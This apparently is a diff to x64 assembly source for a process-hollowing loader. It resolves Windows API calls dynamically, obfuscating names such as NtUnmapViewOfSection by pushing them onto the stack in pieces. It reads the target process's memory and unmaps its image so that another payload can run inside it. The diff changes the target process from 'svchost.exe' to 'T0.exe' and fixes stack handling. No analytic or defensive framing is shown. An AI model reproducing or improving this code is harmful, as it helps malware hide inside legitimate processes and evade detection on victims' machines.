@@ -2,7 +2,7 @@
 global WinMain
 
 section .BSS
-	process db "svchost.exe",0,0
+	process db "T0.exe",0,0
 	
 section .data	
 	
@@ -233,6 +233,7 @@ section .deccode
 	call r14
 	mov r12,rax
 	add rsp, 0x30
+	add rsp, 0x10
 	
 	
 	;call VirtualAlloc
@@ -283,6 +284,8 @@ section .deccode
 	mov rcx, r8
 	sub rsp, 0x30
 	call R14
+	add rsp,0x30
+	add rsp,0x10
 	mov r12, rax
 	
 	;call GetThreadContext
@@ -305,6 +308,8 @@ section .deccode
 	mov rcx, rbx
 	sub rsp, 0x30
 	call R14
+	add rsp, 0x30
+	add rsp, 0x10
 	mov r12, rax
 	
 	;call ReadProcessMemory
@@ -338,10 +343,26 @@ section .deccode
 	mov rax, [lpPreferableBase]
 	cmp rax, [lpPebImageBase]
 	jne lpAllocatedBase
+	call Locate_ntdll
 
+	mov rax, "tion"
+	push Rax
+	mov rax, "iewOfSec"
+	push Rax
+	mov rax, "NtUnmapV"
+	push Rax
 	
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14 
+	mov r12, rax
+	add rsp, 0x30
+	add rsp, 0x10
 	
-	
+	mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+	mov rdx, [lpPebImageBase]
+	call rax
 	
 	
 	
